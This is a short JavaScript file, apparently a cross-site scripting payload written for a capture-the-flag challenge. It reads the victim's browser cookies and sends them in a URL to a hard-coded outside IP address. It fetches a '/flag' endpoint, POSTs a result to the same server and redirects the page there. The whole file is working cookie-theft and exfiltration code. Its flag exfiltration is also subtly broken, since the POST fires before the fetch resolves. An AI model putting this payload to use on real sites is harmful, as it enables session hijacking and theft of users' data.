const cookie = document.cookie;
const targetServer = "http://139.224.199.99:9999/";
const target = targetServer + "cookie?" + cookie;
let responseData;

fetch('http://0192d5de50dd7dfeb24785eecc33bd0b.uy3t.dg02.ciihw.cn:44940/flag', {
    method: 'GET',
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
})
.then(data => {
    responseData = data;
})

fetch(target, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        result: responseData
    })
})

window.location.replace(target);
